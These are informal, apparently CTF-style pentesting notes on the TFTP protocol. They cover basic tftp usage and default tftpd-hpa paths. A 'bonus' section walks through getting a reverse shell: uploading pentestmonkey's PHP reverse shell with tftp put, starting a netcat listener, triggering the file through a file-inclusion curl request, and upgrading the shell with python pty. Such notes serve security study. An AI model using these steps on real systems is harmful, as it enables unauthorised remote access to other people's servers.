# TFTP - Trivial File Transfer Protocol
﷽
* A simple protocol that provides basic file transfer function ***without authentication needed***.
* Uses `UDP` to work.
## usage
* `tftp` to enter
* it's really simple omds sa'd

* The default configuration file for `tftpd-hpa` is `/etc/default/tftpd-hpa`.
* The default `root` directory where files will be stored is `var/lib/tftpboot`.

* use `get` and `put` to manipulate files.
* this is a really basic program, don't be stupid

### as a bonus, getting a reverse shell (it's stupid easy u schmuck)

* use the `php-reverse-shell.php` by pentestmonkey the goat for this.
  * make sure the `ip` and `port` have been changed for your IP and port.

* open `tftp` with `tftp`.
* stupid easy:
  * put `php-reverse-shell.php`
* done, the shell is on!

* start a `nc` listener:
  * `nc -lvnp 7777`, where
  * `7777` is the port.

* now, request the shell by navigating to it:
* `curl 'http://{target_IP}/?file=/var/lib/tftpboot/php-reverse-shell.php'`

* upgrade the shell by `python3 -c 'import pty;pty.spawn("/bin/bash")'`-ing it.



